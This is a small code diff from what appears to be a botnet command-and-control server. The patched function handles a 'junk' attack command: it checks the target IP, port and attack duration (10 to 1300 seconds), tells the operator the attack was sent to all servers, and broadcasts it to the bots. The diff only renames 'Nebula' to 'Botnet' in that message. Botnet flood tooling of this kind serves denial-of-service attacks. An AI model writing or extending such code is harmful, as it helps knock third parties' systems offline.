@@ -8,7 +8,7 @@ def junk(args, validate_ip, validate_port, validate_time, send, client, ansi_cle
         if validate_ip(ip):
             if validate_port(port):
                 if validate_time(secs):
-                    send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.LIGHTBLACK_EX}Nebula {Fore.LIGHTWHITE_EX}servers!")
+                    send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.LIGHTBLACK_EX}Botnet {Fore.LIGHTWHITE_EX}servers!")
                     broadcast(data)
                 else:
                     send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
